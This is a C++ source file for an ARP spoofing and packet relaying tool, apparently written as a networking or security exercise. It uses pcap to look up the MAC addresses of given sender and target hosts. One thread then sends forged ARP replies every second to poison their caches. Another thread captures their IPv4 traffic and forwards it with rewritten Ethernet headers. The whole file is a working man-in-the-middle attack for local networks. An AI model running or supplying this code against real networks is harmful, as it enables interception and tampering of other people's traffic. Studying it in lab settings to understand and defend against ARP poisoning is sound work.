#include <iostream>
#include <thread>
#include <vector>
#include <string>
#include <cstdio>
#include <cstdlib>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/if_ether.h>
#include "ip.h"
#include "infofetcher.h"
#include "arp.h"

using namespace std;

#define PCAP_ERR_BUF_SIZE 1024
#define PACK_BUF_SIZE 1024 * 64
#define ARP_SPOOFING_PERIOD 1

static pcap_t *handle;
static IPv4_addr my_ip_addr;
static MAC_addr my_mac_addr;
static vector<IPv4_addr> sender_ips;
static vector<IPv4_addr> target_ips;
static vector<MAC_addr> sender_macs;
static vector<MAC_addr> target_macs;

void thread_spoofing();
void thread_relaying();

int main(int argc, char *argv[]) 
{	
	char errbuf[PCAP_ERR_BUF_SIZE];
	char *if_name;

	// Argument Check
	if (argc < 4) 
	{
	   	printf("Usage: %s <Interface> [<Sender IP_1> <Target IP_1>] [<Sender IP_2> <Target IP_2>]\n", argv[0]); 
		return EXIT_FAILURE;
	}

	if_name = argv[1];
	argc -= 2;
	for (int i = 2; i <= argc; i += 2) 
	{
		sender_ips.push_back(argv[i]);
		target_ips.push_back(argv[i+1]);
	}


	for (u_int i=0; i < sender_ips.size(); i++) 
	{
		cout << "Sender_IP [" << i+1 << "] - ";
		sender_ips[i].ascii_dump();
		cout << endl;
	}
	for (u_int i=0; i < target_ips.size(); i++) 
	{
		cout << "Target_IP [" << i+1 << "] - ";
		target_ips[i].ascii_dump();
		cout << endl;
	}


	// Get My Network Information
	get_my_ip_str(if_name, my_ip_addr);
	get_my_mac_str(if_name, my_mac_addr);
		
	cout << "My IPv4 address is ";
	my_ip_addr.ascii_dump();
	cout << endl;
	cout << "My MAC address is ";
	my_mac_addr.hex_dump();
	cout << endl;

	handle = pcap_open_live(if_name, PACK_BUF_SIZE, 0, 1, errbuf);
	if (handle == NULL) 
	{
		printf("Interface Open Error %s : %s\n", if_name, errbuf);
		exit(EXIT_FAILURE);
	}

	for (u_int i = 0; i < sender_ips.size(); i++) 
	{
		auto sender_ip = sender_ips[i];
		sender_ip.ascii_dump();
		putchar('\n');
		printf("Try to Send ARP request...\n");
		
		// Send ARP Request
		int send_status = send_arp_request(handle, my_mac_addr, my_ip_addr, sender_ip);
		if (send_status == EXIT_SUCCESS) 
		{
			printf("Send ARP Request Success\n");
		} 
		else 
		{
			printf("Send ARP Request Failed\n");
			return EXIT_FAILURE;
		}


		MAC_addr tmp_mac;
		// Receive ARP Reply
		int recv_status = recv_arp_reply(handle, sender_ip, tmp_mac);
		if (recv_status == EXIT_SUCCESS) 
		{
			printf("Receive ARP Reply Success\n");
		} 
		else 
		{
			printf("Receive ARP Reply Failed\n");
			return EXIT_FAILURE;		
		}
		
		sender_macs.push_back(tmp_mac);
			
		printf("* Store MAC address ");
		tmp_mac.hex_dump();
		cout << " = ";
		sender_ip.ascii_dump();
		cout << endl;
	}

	//Gathering Target MAC address
	for (u_int i = 0; i < target_ips.size(); i++) 
	{
		auto target_ip = target_ips[i];
		printf("[%2u/%2lu]Gathering Target's MAC addr: ", i, target_ips.size());
		target_ip.ascii_dump();
		putchar('\n');
		printf("Try to Send ARP request...\n");
	
		// Send ARP Request
		int send_status = send_arp_request(handle, my_mac_addr, my_ip_addr, target_ip);
		if (send_status == EXIT_SUCCESS) 
		{
			printf("Send ARP Request Success\n");
		} 
		else 
		{
			printf("Send ARP Request Failed\n");
			return EXIT_FAILURE;
		}


		MAC_addr tmp_mac;
		// Receive ARP Reply
		int recv_status = recv_arp_reply(handle, target_ip, tmp_mac);
		if (recv_status == EXIT_SUCCESS) 
		{
			printf("Receive ARP Reply Success\n");
		} 
		else 
		{
			printf("Receive ARP Reply Failed\n");
			return EXIT_FAILURE;		
		}

		target_macs.push_back(tmp_mac);
		printf("* Store MAC address ");
		tmp_mac.hex_dump();
		cout << " = ";
		target_ip.ascii_dump();
		cout << endl;
	}

	thread spoofing_thread(thread_spoofing);
	thread relaying_thread(thread_relaying);
	spoofing_thread.join();
	relaying_thread.join();

	return EXIT_SUCCESS;
}

void thread_spoofing() 
{
	while(true) 
	{
		for (u_int i=0; i < sender_macs.size(); i++) 
		{
			send_arp_reply(handle, my_mac_addr, sender_macs[i], target_ips[i], sender_ips[i]);
		}
		sleep(ARP_SPOOFING_PERIOD);
	}
}

void thread_relaying() 
{
	struct pcap_pkthdr* header_ptr;
	const u_char *pkt_data;
	struct ether_header* eth_hdr;
	struct ip* ip_hdr;
	while(true) 
	{
		int status = pcap_next_ex(handle, &header_ptr, &pkt_data);
		// Check Status
		if (status == 0) 
			continue; 
		else if (status == -1) 
		{
			printf("While Packet Relaying, Something Wrong on Interface: %s\n", pcap_geterr(handle));
			return;
		} 
		else if (status == -2) 
		{
			printf("While Packet Relaying, Unexpected Accident Occured\n");
			return;
		}

		eth_hdr = (struct ether_header*)pkt_data;

		// Check IPv4
		if (ntohs(eth_hdr->ether_type) == ETHERTYPE_IP) 
			ip_hdr = (struct ip*)(pkt_data + sizeof(struct ether_header)); 
		else 
			continue;

		if (ip_hdr->ip_v != 4)
			continue;
		IPv4_addr dst_ip;
		IPv4_addr src_ip;
		dst_ip.parse_mem((char*)&ip_hdr->ip_dst);
		src_ip.parse_mem((char*)&ip_hdr->ip_src);
		if (!my_ip_addr.is_equal(dst_ip)) 
		{ 

			cout << "This Pack is not for me Destination IP: ";
			dst_ip.ascii_dump();
			cout << endl;
			cout << "Source IP: ";
			src_ip.ascii_dump();
			cout << endl;
		
			
			for (u_int i = 0; i < sender_ips.size(); i++) 
			{ 
				auto sender_ip = sender_ips[i];
				if (sender_ip.is_equal(src_ip)) 
				{
					// Sender -> Target Packet
					MAC_addr dst_mac = target_macs[i];
					cout << "Real Destination MAC: ";
					dst_mac.hex_dump();
					cout << endl;
					dst_mac.write_mem(eth_hdr->ether_dhost);
					my_mac_addr.write_mem(eth_hdr->ether_shost);

					if (pcap_sendpacket(handle, pkt_data, header_ptr->len) == -1) 
						printf("Sendpacket Error \n"); 
					else 
						printf("Packet Relay Success!\n");
					break;
				}

				if (sender_ip.is_equal(dst_ip)) 
				{
					MAC_addr dst_mac = sender_macs[i];
					cout << "Real Destination MAC: ";
					dst_mac.hex_dump();
					cout << endl;
					dst_mac.write_mem(eth_hdr->ether_dhost);
					my_mac_addr.write_mem(eth_hdr->ether_shost);

					if (pcap_sendpacket(handle, pkt_data, header_ptr->len) == -1) 
						printf("Sendpacket Error\n");
					else 
						printf("Packet relay Success!\n");
					break;
				}
			}
		}
	}
}
